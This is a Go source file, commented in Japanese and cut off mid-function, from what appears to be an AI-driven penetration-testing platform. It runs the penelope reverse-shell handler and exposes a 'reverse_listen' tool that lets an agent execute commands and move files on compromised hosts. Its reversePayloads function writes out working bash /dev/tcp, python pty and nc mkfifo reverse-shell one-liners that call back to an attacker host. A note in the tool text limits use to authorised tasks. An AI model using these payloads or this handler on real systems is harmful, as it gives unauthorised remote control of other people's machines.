// reverse.go は reverse のリバースシェル handler を組み立てる（イントラネット侵攻フェーズ 5、docs/architecture/intranet-pivot.md
// §4.3a 管理リソース原則 + フェーズ 5）:管理下の penelope プロセス（--mcp ローカルトークン認証、自動 PTY
// 昇格、セッションログの永続化）+ MCP ブリッジ（penelope セッションを sessions 台帳 kind="reverse"
// とプロセス内 Registry へ同期）+ reverse_listen ツール。同期後は session_exec/session_read/
// session_write とイントラネットページのセッションパネルが自動で使える（フロントエンドの変更は不要）。
//
// penelope MCP API の結論（2026-09-13 テスト機での実測 + penelope.py MCPServer のソース）:
//   - エンドポイント POST /（GET 405）;Authorization: Bearer <token>（hmac.compare_digest、
//     token なし/不一致は 401）;レスポンスは通常の application/json（SSE ではない）;Mcp-Session-Id は発行しない;
//     プロトコルバージョン 2025-06-18（2025-03-26/2024-11-05 と互換）;notification は 202 を返す。
//   - ツールは 6 個、結果はいずれも単一 text block に埋め込んだ JSON（isError 時 text は "Error: …"）:
//     list_sessions{} → {"sessions":[{id,name,ip,port,OS,type,user,source}]}
//     get_session_info{session_id} → ほかに hostname/system/arch/cwd を含む
//     exec_in_session{session_id,command} → {"output":"…"}（stdout/stderr はマージ済み）
//     kill_session{session_id} → {"ok":true}
//     upload_to_session{session_id,local_path,remote_path?} → {"uploaded":[…]},
//       remote_path は【ディレクトリ】でなければならない（既定はセッションの cwd）、ファイル名はローカルファイルの basename
//     download_from_session{session_id,remote_path} → {"downloaded":[ローカルの絶対パス]},
//       ~/.penelope/sessions/<name>/downloads/ 配下に保存
//   - ファイル転送には持続的 shell（agent または auto-upgrade 後の PTY）が必要で、なければ error を返す;
//     未知のセッションは JSON-RPC -32602;セッションの死は list_sessions からの消失で分かる（watchdog の判断根拠）。
//   - penelope にリバース接続の合言葉はない:待ち受けは既定で 127.0.0.1 のみにバインド、ターゲットから直接リバースさせる場合、reverse_listen に
//     iface を明示する;暗号化は期待しない（暗号化 webshell/トンネルで行う）。
package server

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/mcphttp"
	"github.com/Autumn-27/artex/session"
	actool "github.com/Autumn-27/norma/tool"
)

// reverseSyncInterval は handler が生きている間のセッション同期（watchdog）のポーリング間隔。
const reverseSyncInterval = 10 * time.Second

// reverseStartTimeout は penelope の MCP/待ち受けポートの準備完了を待つ上限。
const reverseStartTimeout = 15 * time.Second

// defaultReversePort は reverse_listen で port 未指定時の既定のリバース待ち受けポート。
const defaultReversePort = 4444

// mcpCaller は reverseShell が依存する最小の MCP 呼び出し面（*mcphttp.Client が満たす;
// 単体テストでは偽実装を注入する）。
type mcpCaller interface {
	Call(ctx context.Context, tool string, args any) (string, error)
}

// penSession は penelope の list_sessions/get_session_info が返す 1 セッションの射影。
type penSession struct {
	ID       int    `json:"id"`
	Name     string `json:"name"`
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	OS       string `json:"OS"`
	Type     string `json:"type"`
	User     string `json:"user"`
	Source   string `json:"source"`
	Hostname string `json:"hostname,omitempty"`
	System   string `json:"system,omitempty"`
	Arch     string `json:"arch,omitempty"`
	CWD      string `json:"cwd,omitempty"`
}

// reverseSecret は kind=reverse セッションを永続化する secret の構造体（AES-GCM 暗号化保存）:
// penelope のセッション識別子 + 現行 handler の MCP 接続パラメータ（診断/突合用、復元は非対応。
// penelope のセッションはそのプロセスのメモリ内にあり、プラットフォーム再起動後は initReverse が正直に dead を付ける）。
type reverseSecret struct {
	PenelopeID int    `json:"penelope_id"`
	Name       string `json:"name"`
	MCPURL     string `json:"mcp_url"`
	Token      string `json:"token"`
}

// --- 埋め込み JSON text block の解析（純粋関数、テスト可能） ---

// parsePenSessions は list_sessions の text block を解析する。
func parsePenSessions(text string) ([]penSession, error) {
	var res struct {
		Sessions []penSession `json:"sessions"`
	}
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return nil, fmt.Errorf("list_sessions の応答解析に失敗しました: %w", err)
	}
	return res.Sessions, nil
}

// parsePenInfo は get_session_info の text block を解析する。
func parsePenInfo(text string) (*penSession, error) {
	var ps penSession
	if err := json.Unmarshal([]byte(text), &ps); err != nil {
		return nil, fmt.Errorf("get_session_info の応答解析に失敗しました: %w", err)
	}
	return &ps, nil
}

// parseExecOutput は exec_in_session の text block を解析する:{"output":…} または {"error":…}。
func parseExecOutput(text string) (string, error) {
	var res struct {
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return "", fmt.Errorf("exec_in_session の応答解析に失敗しました: %w", err)
	}
	if res.Error != "" {
		return "", fmt.Errorf("%s", res.Error)
	}
	return res.Output, nil
}

// parseStringList は {"downloaded":[…]}/{"uploaded":[…]} のような単一キーの文字列リストを解析する。
func parseStringList(key, text string) ([]string, error) {
	var res map[string]json.RawMessage
	if err := json.Unmarshal([]byte(text), &res); err != nil {
		return nil, fmt.Errorf("%s の応答解析に失敗しました: %w", key, err)
	}
	raw, ok := res[key]
	if !ok {
		return nil, fmt.Errorf("%s の応答に %q キーがありません: %s", key, key, truncateOutput(text))
	}
	var out []string
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, fmt.Errorf("%s のリスト解析に失敗しました: %w", key, err)
	}
	return out, nil
}

// splitRemotePath はターゲット側の絶対パスを（ディレクトリ, basename）に分解する:/a/b/c → （/a/b, c）;
// ディレクトリ部分がなければ dir は空（= セッションの cwd）。Unix 形式のみ（reverse フェーズ 5 は Unix ターゲット向け）。
func splitRemotePath(p string) (dir, base string) {
	p = strings.TrimSpace(p)
	i := strings.LastIndexByte(p, '/')
	if i < 0 {
		return "", p
	}
	if i == 0 {
		return "/", p[1:]
	}
	return p[:i], p[i+1:]
}

// diffPenSessions は penelope の生存セッション id 集合と登録済みマッピング（penID→dbID）を比較し、
// 新規登録が必要な id と、消失した（dead を付けるべき）マッピングを返す。純粋関数、テスト可能。
func diffPenSessions(active []int, known map[int]int64) (newIDs []int, dead map[int]int64) {
	seen := map[int]bool{}
	for _, id := range active {
		seen[id] = true
		if _, ok := known[id]; !ok {
			newIDs = append(newIDs, id)
		}
	}
	dead = map[int]int64{}
	for id, dbID := range known {
		if !seen[id] {
			dead[id] = dbID
		}
	}
	return newIDs, dead
}

// reversePayloads はよく使うリバース接続 payload を生成する（host は ARTEX_CALLBACK_ADDR のホスト部分）。
func reversePayloads(host string, port int) map[string]string {
	return map[string]string{
		"bash": fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", host, port),
		"python": fmt.Sprintf(`python3 -c 'import socket,os,pty;s=socket.socket();s.connect((%q,%d));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`, host, port),
		"nc": fmt.Sprintf("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f", host, port),
	}
}

// --- PenelopeHandler:管理下の penelope プロセス（シングルトン遅延起動） ---

// PenelopeHandler はプラットフォーム側のリバースシェル handler:管理下で起動する penelope の長寿命プロセス
// （管理リソース原則:プロセス/ポート/ログはすべて台帳に登録し、プラットフォームが回収する）。MCP は 127.0.0.1 のみにバインドし、
// ランダムな Bearer token を使う;リバース待ち受けポートはポート監査台帳に登録する。
type PenelopeHandler struct {
	bgCtx   context.Context // server のライフサイクル ctx（同期ループ/終了時のクリーンアップ用）
	dataDir string
	binPath string
	python  string
	store   *db.SessionStore
	reg     *session.Registry

	mu          sync.Mutex
	cmd         *exec.Cmd
	mcp         *mcphttp.Client
	mcpURL      string
	token       string
	mcpPort     int
	listenPort  int
	listenIface string
	running     bool
	taskID      int64
	intentID    int64
	pen         map[int]int64 // penelope のセッション id → sessions テーブルの id
	syncStop    context.CancelFunc
}

// newPenelopeHandler は handler を構築する（プロセスは起動しない）。binPath の解決順：ARTEX_PENELOPE_PATH >
// dataDir/tools/penelope.py;python インタプリタ：ARTEX_PENELOPE_PYTHON > python3。
func newPenelopeHandler(bgCtx context.Context, dataDir string, store *db.SessionStore, reg *session.Registry) *PenelopeHandler {
	binPath := strings.TrimSpace(os.Getenv("ARTEX_PENELOPE_PATH"))
	if binPath == "" {
		binPath = filepath.Join(dataDir, "tools", "penelope.py")
	}
	python := strings.TrimSpace(os.Getenv("ARTEX_PENELOPE_PYTHON"))
	if python == "" {
		python = "python3"
	}
	return &PenelopeHandler{
		bgCtx: bgCtx, dataDir: dataDir, binPath: binPath, python: python,
		store: store, reg: reg, pen: map[int]int64{},
	}
}

// logPath はこの handler のプロセスログ（台帳:ログファイルは dataDir/reverse/ 配下）。
func (h *PenelopeHandler) logPath(port int) string {
	return filepath.Join(h.dataDir, "reverse", fmt.Sprintf("penelope-%d.log", port))
}

// ensure はシングルトンの遅延起動:稼働中で待ち受けパラメータが一致すればそのまま返す;不一致なら現状を添えた
// エラーを返す（1 handler につき待ち受けは 1 口、黙ってポートを変えない）。プロセス死亡後は onExit で
// クリーンアップし、次の ensure で起動し直す（死亡と再生成:セッションを生かしたふりはせず、再生成 = ターゲットに再度リバース接続させること）。
func (h *PenelopeHandler) ensure(ctx context.Context, listenPort int, iface string, taskID, intentID int64) error {
	h.mu.Lock()
	if h.running {
		if listenPort != h.listenPort || iface != h.listenIface {
			cur1, cur2 := h.listenPort, h.listenIface
			h.mu.Unlock()
			return fmt.Errorf("penelope handler は既に %s:%d で待ち受け中です（シングルトン handler は複数の待ち受け口をサポートしません）;"+
				"そのポートへそのままリバース接続するか、先にプラットフォームを再起動してからポートを変更してください", cur2, cur1)
		}
		h.taskID, h.intentID = taskID, intentID
		h.mu.Unlock()
		return nil
	}
	h.mu.Unlock()

	if _, err := os.Stat(h.binPath); err != nil {
		return fmt.Errorf("penelope がインストールされていません:想定パス %s（%v）;penelope.py をそのパスに置くか ARTEX_PENELOPE_PATH を設定してください", h.binPath, err)
	}
	// MCP ポート:空いている loopback ポートを 1 つ選ぶ（先に確保してから解放し、直後に penelope がバインドする;競合の窓は許容）。
	mcpPort, err := freeLoopbackPort()
	if err != nil {
		return err
	}
	tokenBuf := make([]byte, 24)
	if _, err := rand.Read(tokenBuf); err != nil {
		return fmt.Errorf("MCP token の生成に失敗しました: %w", err)
	}
	token := hex.EncodeToString(tokenBuf)

	if err := os.MkdirAll(filepath.Join(h.dataDir, "reverse"), 0o700); err != nil {
		return fmt.Errorf("handler ログディレクトリの作成に失敗しました: %w", err)
	}
	logFile, err := os.OpenFile(h.logPath(listenPort), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("handler ログファイルの作成に失敗しました: %w", err)
	}

	args := []string{h.binPath,
		"--mcp", "--mcp-host", "127.0.0.1", "--mcp-port", fmt.Sprint(mcpPort), "--mcp-token", token,
		"-p", fmt.Sprint(listenPort), "-i", iface,
		"-C", // no-attach:TTY なし、新規セッションは対話メニューに入れない（メニューが stdin を消費する）
	}
	cmd := exec.Command(h.python, args...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("penelope の起動に失敗しました（%s %s）: %w", h.python, h.binPath, err)
	}

	h.mu.Lock()
	h.cmd, h.token, h.mcpPort = cmd, token, mcpPort
	h.listenPort, h.listenIface = listenPort, iface
	h.mcpURL = fmt.Sprintf("http://127.0.0.1:%d/", mcpPort)
	h.taskID, h.intentID = taskID, intentID
	h.pen = map[int]int64{}
	h.running = true
	h.mu.Unlock()

	// プロセスの見守り:終了したら即座に台帳を整理する（ポート登録解除、セッションは正直に dead を付ける）。生かしたふりはしない。
	go func() {
		err := cmd.Wait()
		_ = logFile.Close()
		h.onExit(err)
	}()

	// MCP の準備完了と待ち受け口の実バインドを待つ（バインド失敗 = ポートが使用中。待ち受けているふりをせず正直にエラーを返す）。
	if err := h.waitReady(ctx, listenPort, iface); err != nil {
		_ = cmd.Process.Kill()
		return err
	}
	registerManagedPort(listenPort)
	registerManagedPort(mcpPort)

	syncCtx, cancel := context.WithCancel(h.bgCtx)
	h.mu.Lock()
	h.syncStop = cancel
	h.mu.Unlock()
	go h.syncLoop(syncCtx)
	log.Printf("[reverse] penelope handler を起動しました:待ち受け %s:%d、MCP 127.0.0.1:%d、ログ %s",
		iface, listenPort, mcpPort, h.logPath(listenPort))
	return nil
}

// waitReady は MCP initialize と待ち受け口のバインドを、準備完了・タイムアウト・プロセス終了のいずれかまでポーリングする。
func (h *PenelopeHandler) waitReady(ctx context.Context, listenPort int, iface string) error {
	logPath := h.logPath(listenPort)
	deadline := time.Now().Add(reverseStartTimeout)
	for time.Now().Before(deadline) {
		h.mu.Lock()
		running := h.running
		h.mu.Unlock()
		if !running {
			return fmt.Errorf("penelope が起動直後に終了しました、ログ: %s", logPath)
		}
		if _, err := h.connectMCP(ctx); err == nil {
			if h.listenerBound() {
				return nil
			}
			// MCP は起動済みだが待ち受け口がまだバインドされていない:待ち続け、タイムアウトしたらバインド失敗として扱う。
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(300 * time.Millisecond):
		}
	}
	if _, err := h.connectMCP(ctx); err != nil {
		return fmt.Errorf("penelope MCP が %v 以内に準備完了しませんでした: %w（ログ: %s）", reverseStartTimeout, err, logPath)
	}
	return fmt.Errorf("penelope が %s:%d で待ち受けできませんでした（ポートが使用中?）、ログ: %s", iface, listenPort, logPath)
}

// listenerBound はリバース待ち受け口が実際に LISTEN しているか確認する（portaudit の /proc 解析を再利用;
// Linux 以外では確認できないため通す。MCP が使えることが最低限の健全性ライン）。
func (h *PenelopeHandler) listenerBound() bool {
	if runtime.GOOS != "linux" {
		return true
	}
	h.mu.Lock()
	port := h.listenPort
	h.mu.Unlock()
	for _, path := range []string{"/proc/net/tcp", "/proc/net/tcp6"} {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		for _, ls := range parseProcNetTCP(string(data)) {
			if ls.Port == port {
				return true
			}
		}
	}
	return false
}

// connectMCP は MCP クライアントを作成（または再作成）する（initialize ハンドシェイク）。
func (h *PenelopeHandler) connectMCP(ctx context.Context) (*mcphttp.Client, error) {
	h.mu.Lock()
	url, token := h.mcpURL, h.token
	h.mu.Unlock()
	if url == "" {
		return nil, fmt.Errorf("handler が起動していません")
	}
	mc, err := mcphttp.New(ctx, "penelope", url, map[string]string{"Authorization": "Bearer " + token}, false)
	if err != nil {
		return nil, err
	}
	h.mu.Lock()
	if h.mcp != nil && h.mcp != mc {
		_ = h.mcp.Close()
	}
	h.mcp = mc
	h.mu.Unlock()
	return mc, nil
}

// mcpCall は penelope の MCP ツールを 1 回呼ぶ;接続系のエラー（プロセス再起動で旧 client が失効）なら
// クライアントを作り直して 1 回だけ再試行する。
func (h *PenelopeHandler) mcpCall(ctx context.Context, tool string, args any) (string, error) {
	h.mu.Lock()
	mc := h.mcp
	h.mu.Unlock()
	if mc == nil {
		return "", fmt.Errorf("penelope MCP に接続していません（handler が起動していない?）")
	}
	out, err := mc.Call(ctx, tool, args)
	if err == nil {
		return out, nil
	}
	nm, nerr := h.connectMCP(ctx)
	if nerr != nil {
		return "", err // 再接続に失敗したので元のエラーを返す（ツールの意味が分かる）
	}
	return nm.Call(ctx, tool, args)
}

// onExit はプロセス終了時のクリーンアップ:ポート台帳の登録解除、同期ループの停止、登録済みセッションすべてに正直に dead を付ける。
func (h *PenelopeHandler) onExit(waitErr error) {
	h.mu.Lock()
	if !h.running {
		h.mu.Unlock()
		return
	}
	h.running = false
	listenPort, mcpPort := h.listenPort, h.mcpPort
	dead := make([]int64, 0, len(h.pen))
	for _, dbID := range h.pen {
		dead = append(dead, dbID)
	}
	h.pen = map[int]int64{}
	if h.syncStop != nil {
		h.syncStop()
		h.syncStop = nil
	}
	mc := h.mcp
	h.mcp = nil
	h.mu.Unlock()

	unregisterManagedPort(listenPort)
	unregisterManagedPort(mcpPort)
	if mc != nil {
		_ = mc.Close()
	}
	for _, dbID := range dead {
		if err := h.store.UpdateStatus(h.bgCtx, dbID, db.SessionDead); err != nil {
			log.Printf("[reverse] セッション %d への dead 付与に失敗しました: %v", dbID, err)
		}
		h.reg.Remove(dbID)
	}
	log.Printf("[reverse] penelope handler が終了しました（%v）、%d 件のセッションに dead を付与;次回の reverse_listen で自動起動します",
		waitErr, len(dead))
}

// close はプラットフォーム終了時に管理下のプロセスを回収する（管理リソース原則:プラットフォームが回収し、孤児を残さない）。
func (h *PenelopeHandler) close() {
	h.mu.Lock()
	cmd, running := h.cmd, h.running
	h.mu.Unlock()
	if !running || cmd == nil || cmd.Process == nil {
		return
	}
	_ = cmd.Process.Kill() // 残りのクリーンアップは Wait の見守り goroutine（onExit）が行う
}

// syncLoop はセッション同期の watchdog:SyncSessions を定期的に実行する（新規セッションの登録、消失セッションへの dead 付与）。
func (h *PenelopeHandler) syncLoop(ctx context.Context) {
	t := time.NewTicker(reverseSyncInterval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			if _, err := h.SyncSessions(ctx); err != nil {
				log.Printf("[reverse] セッション同期に失敗しました: %v", err)
			}
		}
	}
}

// SyncSessions は penelope のセッションと sessions 台帳を突合する:新規セッションを永続化し Registry へ登録
// （kind="reverse"）;消失したセッションには dead を付けて Registry から外す。現在の生存セッション数を返す。
func (h *PenelopeHandler) SyncSessions(ctx context.Context) (int, error) {
	out, err := h.mcpCall(ctx, "list_sessions", map[string]any{})
	if err != nil {
		return 0, fmt.Errorf("list_sessions: %w", err)
	}
	sessions, err := parsePenSessions(out)
	if err != nil {
		return 0, err
	}
	active := make([]int, 0, len(sessions))
	for _, ps := range sessions {
		active = append(active, ps.ID)
	}
	h.mu.Lock()
	newIDs, dead := diffPenSessions(active, h.pen)
	h.mu.Unlock()

	for penID, dbID := range dead {
		if err := h.store.UpdateStatus(ctx, dbID, db.SessionDead); err != nil {
			log.Printf("[reverse] セッション %d への dead 付与に失敗しました: %v", dbID, err)
		}
		h.reg.Remove(dbID)
		h.mu.Lock()
		delete(h.pen, penID)
		h.mu.Unlock()
		log.Printf("[reverse] セッション %d（penelope #%d）が消失したため、台帳に dead を付与しました", dbID, penID)
	}
	for _, penID := range newIDs {
		if err := h.registerPenSession(ctx, penID); err != nil {
			log.Printf("[reverse] penelope セッション #%d の登録に失敗しました: %v", penID, err)
		}
	}
	h.mu.Lock()
	n := len(h.pen)
	h.mu.Unlock()
	return n, nil
}

// registerPenSession はセッション詳細を取得 → 永続化（kind=reverse）→ Session アダプタを Registry へ登録する。
func (h *PenelopeHandler) registerPenSession(ctx context.Context, penID int) error {
	out, err := h.mcpCall(ctx, "get_session_info", map[string]any{"session_id": penID})
	if err != nil {
		return fmt.Errorf("get_session_info: %w", err)
	}
	ps, err := parsePenInfo(out)
	if err != nil {
		return err
	}
	h.mu.Lock()
	token, mcpURL := h.token, h.mcpURL
	taskID, intentID := h.taskID, h.intentID
	h.mu.Unlock()
	secret, _ := json.Marshal(reverseSecret{PenelopeID: ps.ID, Name: ps.Name, MCPURL: mcpURL, Token: token})
	lang := strings.ToLower(ps.System)
	if lang == "" {
		lang = strings.ToLower(ps.OS)
	}
	rec := &db.SessionRecord{
		Kind:  "reverse",
		URL:   fmt.Sprintf("reverse://%s", net.JoinHostPort(ps.IP, fmt.Sprint(ps.Port))),
		Lang:  lang,
		Secret: secret,
		Status: db.SessionAlive, CreatedByTask: taskID, CreatedByIntent: intentID,
	}
	dbID, err := h.store.Create(ctx, rec)
	if err != nil {
		return fmt.Errorf("永続化に失敗しました: %w", err)
	}
	sh := &reverseShell{
		id: dbID, penID: ps.ID, name: ps.Name,
		user: ps.User, os: ps.OS, caller: h.mcpCallerFunc(),
	}
	h.reg.Add(sh)
	h.mu.Lock()
	h.pen[ps.ID] = dbID
	h.mu.Unlock()
	log.Printf("[reverse] 新規セッションを登録しました：db #%d ← penelope #%d %s %s@%s（%s %s）",
		dbID, ps.ID, ps.Name, ps.User, ps.IP, ps.OS, ps.Arch)
	return nil
}

// mcpCallerFunc は handler の mcpCall を mcpCaller で包む（reverseShell は関数値を保持し、
// handler を逆参照しないので、単体テストで偽実装を注入しやすい）。
func (h *PenelopeHandler) mcpCallerFunc() mcpCaller {
	return mcpCallerFunc(h.mcpCall)
}

type mcpCallerFunc func(ctx context.Context, tool string, args any) (string, error)

func (f mcpCallerFunc) Call(ctx context.Context, tool string, args any) (string, error) {
	return f(ctx, tool, args)
}

// freeLoopbackPort は空いている loopback の TCP ポートを 1 つ選ぶ（先に確保してから解放）。
func freeLoopbackPort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, fmt.Errorf("空き MCP ポートの割り当てに失敗しました: %w", err)
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}

// --- reverseShell:Session インターフェースのアダプタ（penelope MCP 経由でターゲット側を操作する） ---

// reverseShell は penelope のリバースセッション 1 本を session.Session に適合させる：Exec は
// exec_in_session;ReadFile は download_from_session（penelope がローカルに落としてから読み戻す）;
// WriteFile は upload_to_session（まずローカルの一時ファイルに書き、remote_path はディレクトリでなければならない）。
type reverseShell struct {
	id     int64
	penID  int
	name   string
	user   string
	os     string
	caller mcpCaller

	execMu sync.Mutex // 同一セッションの実行は直列化：shell は状態（cwd）を持つため、並行 exec は混線する
}

func (sh *reverseShell) ID() int64    { return sh.id }
func (sh *reverseShell) Kind() string { return "reverse" }

// Test は疎通確認：echo でセンチネルを送り、そのエコーにセンチネルが含まれて初めて生存とみなす。
func (sh *reverseShell) Test(ctx context.Context) error {
	sentinel := "artex_pen_" + hex.EncodeToString(func() []byte { b := make([]byte, 6); _, _ = rand.Read(b); return b }())
	stdout, _, err := sh.Exec(ctx, "echo "+sentinel, 10*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(stdout, sentinel) {
		return fmt.Errorf("session test: センチネルがエコーされません（セッションが死んでいるか乗っ取られている可能性）")
	}
	return nil
}

// Exec は exec_in_session 経由でターゲット側で実行する。penelope のチャネルは stdout/stderr が統合済みで、
// stderr は常に空（セッションの契約どおり）。タイムアウトは HTTP の待機を切るだけで。penelope 側のコマンドは
// 走り続けており、次のコマンドの出力に残骸が混ざるため、呼び出し側は長いコマンドを避ける（ツール説明に記載済み）。
func (sh *reverseShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (stdout, stderr string, err error) {
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "exec_in_session", map[string]any{
		"session_id": sh.penID, "command": cmd,
	})
	if err != nil {
		return "", "", fmt.Errorf("session exec: %w", err)
	}
	stdout, err = parseExecOutput(out)
	if err != nil {
		return "", "", fmt.Errorf("session exec: %w", err)
	}
	return stdout, "", nil
}

// ReadFile は download_from_session 経由：penelope がターゲット側のファイルをローカル
// （~/.penelope/sessions/<name>/downloads/ 配下）へ取得してローカルの絶対パスを返すので、そのバイト列を読み戻す。
// 持続的でない shell（auto-upgrade 前）では penelope が error を返すので、そのまま送出する。
func (sh *reverseShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "download_from_session", map[string]any{
		"session_id": sh.penID, "remote_path": path,
	})
	if err != nil {
		return nil, fmt.Errorf("session read: %w", err)
	}
	paths, err := parseStringList("downloaded", out)
	if err != nil {
		return nil, fmt.Errorf("session read: %w", err)
	}
	if len(paths) == 0 {
		return nil, fmt.Errorf("session read: penelope がダウンロードパスを返しません（ターゲット側にこのファイルがない?）")
	}
	if len(paths) > 1 {
		return nil, fmt.Errorf("session read: %q は %d 個のファイルに一致しました、正確なパスを指定してください", path, len(paths))
	}
	data, err := os.ReadFile(paths[0])
	if err != nil {
		return nil, fmt.Errorf("session read: ローカルのダウンロード済みファイルの読み込みに失敗しました: %w", err)
	}
	return data, nil
}

// WriteFile は upload_to_session 経由:まずローカルの一時ファイルに書く（basename はターゲットと一致させる。
// penelope のアップロードはローカルのファイル名を保持する）、remote_path にはターゲットのディレクトリを渡す（ディレクトリ必須、実測どおり）。
func (sh *reverseShell) WriteFile(ctx context.Context, path string, data []byte) error {
	dir, base := splitRemotePath(path)
	if base == "" {
		return fmt.Errorf("session write: 不正なターゲットパス %q", path)
	}
	tmpDir, err := os.MkdirTemp("", "artex-reverse-up-*")
	if err != nil {
		return fmt.Errorf("session write: ローカルの一時ディレクトリ作成に失敗しました: %w", err)
	}
	defer os.RemoveAll(tmpDir)
	local := filepath.Join(tmpDir, base)
	if err := os.WriteFile(local, data, 0o600); err != nil {
		return fmt.Errorf("session write: ローカルへの一時保存に失敗しました: %w", err)
	}
	args := map[string]any{"session_id": sh.penID, "local_path": local}
	if dir != "" {
		args["remote_path"] = dir
	}
	sh.execMu.Lock()
	defer sh.execMu.Unlock()
	out, err := sh.caller.Call(ctx, "upload_to_session", args)
	if err != nil {
		return fmt.Errorf("session write: %w", err)
	}
	uploaded, err := parseStringList("uploaded", out)
	if err != nil {
		return fmt.Errorf("session write: %w", err)
	}
	if len(uploaded) == 0 {
		return fmt.Errorf("session write: penelope のアップロード結果が空です（ターゲットのディレクトリが書き込み不可/持続的でない shell?）")
	}
	return nil
}

// Close は可能な範囲で kill_session を呼ぶ（セッションは既に死んでいる場合があり、エラーは握りつぶす。Registry クリーンアップの意味論）。
func (sh *reverseShell) Close(ctx context.Context) error {
	_, _ = sh.caller.Call(ctx, "kill_session", map[string]any{"session_id": sh.penID})
	return nil
}

// --- init/seed/ツール組み立て ---

// initReverse はリバース handler を作る（シングルトン、プロセスは遅延起動）。プラットフォーム再起動 =
// 前回の penelope の MCP token/ポートはプロセスとともに失われ、生きている reverse セッションは復元できない。
// 正直に dead を付け（生かしたふりはしない）、再生成は次回の reverse_listen に任せる。失敗してもログを残すだけで起動を妨げない。
func (s *Server) initReverse(dataDir string) {
	if s.m.pg == nil || s.sessReg == nil || s.sessStore == nil {
		return
	}
	recs, err := s.sessStore.List(s.ctx, db.SessionAlive)
	if err != nil {
		log.Printf("[reverse] 起動時クリーンアップの読み込みに失敗しました: %v", err)
	} else {
		marked := 0
		for _, rec := range recs {
			if rec.Kind != "reverse" {
				continue
			}
			if err := s.sessStore.UpdateStatus(s.ctx, rec.ID, db.SessionDead); err == nil {
				marked++
			}
		}
		if marked > 0 {
			log.Printf("[reverse] 起動時クリーンアップ:%d 件の前回 reverse セッションに dead を付与しました（MCP 接続パラメータはプロセスとともに失われ復元できません）", marked)
		}
	}
	s.reverse = newPenelopeHandler(s.ctx, dataDir, s.sessStore, s.sessReg)
	go func() { <-s.ctx.Done(); s.reverse.close() }()
}

// reverseTools はリバース待ち受けツールを返す。reverse が nil（DB 未準備）のときは提供しない。
func (s *Server) reverseTools() []actool.CoreTool {
	if s.reverse == nil {
		return nil
	}
	return []actool.CoreTool{s.reverseListenTool()}
}

// reverseListenTool は handler と待ち受けポートの存在を保証し、ポートとよく使うリバース接続 payload を返す。
func (s *Server) reverseListenTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "reverse_listen",
		Description: "【リバース shell 待ち受け·管理下】プラットフォーム側の penelope リバース handler が待ち受けている状態を保証する:シングルトンで遅延起動する管理下プロセス" +
			"（--mcp は 127.0.0.1 のみにバインド + ランダムな Bearer token;自動 PTY 昇格;セッションログの永続化）、待ち受けポートはプラットフォームのポート台帳に登録する。" +
			"待ち受けポートと bash/python/nc のリバース接続 payload（host は ARTEX_CALLBACK_ADDR のリバース接続先）を返す。ターゲットに " +
			"session_exec または脆弱性から payload を起動してリバース接続させる;新しいセッションは自動で sessions 台帳（kind=reverse）へ同期され、以降は " +
			"session_exec/session_read/session_write で操作できる（ファイル転送は penelope の自動 PTY 昇格に依存し、昇格に失敗したセッションは明確なエラーを返す）、" +
			"イントラネットページのセッションパネルに表示される。" +
			"【RoE】承認されたタスクの範囲内でのみ使用する：penelope にリバース接続の合言葉はなく、待ち受けは既定で 127.0.0.1 のみにバインドする（トンネル/ローカルからのリバース接続と併用）;" +
			"ターゲットから直接リバース接続させる場合は iface=0.0.0.0 または NIC の IP を明示する。待ち受けは外部に露出する面を持つ管理下リソースであり、使い終わったセッションは速やかに削除する。" +
			"penelope 自体は暗号化しない（暗号化は暗号化 webshell/トンネルで行う）;セッションの死はプラットフォームが dead を付けて生かしたふりはせず、再生成 = ターゲットに再度リバース接続させること。" +
			"長いコマンドに注意：Exec のタイムアウトはプラットフォーム側の待機を切るだけで、penelope 側のコマンドは走り続ける。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"port":  map[string]any{"type": "integer", "description": "リバース待ち受けポート（既定 4444;handler 稼働中は稼働中のポートと一致させなければならない）"},
				"iface": strParam("待ち受け NIC の IP（既定 127.0.0.1;ターゲットから直接リバース接続させる場合は 0.0.0.0 または NIC の IP を指定）"),
			},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				Port  int    `json:"port"`
				Iface string `json:"iface"`
			}
			_ = json.Unmarshal(in, &a)
			if a.Port <= 0 {
				a.Port = defaultReversePort
			}
			if a.Port > 65535 {
				return actool.Errorf(fmt.Sprintf("port が不正です： %d", a.Port)), nil
			}
			a.Iface = strings.TrimSpace(a.Iface)
			if a.Iface == "" {
				a.Iface = "127.0.0.1"
			}
			if net.ParseIP(a.Iface) == nil {
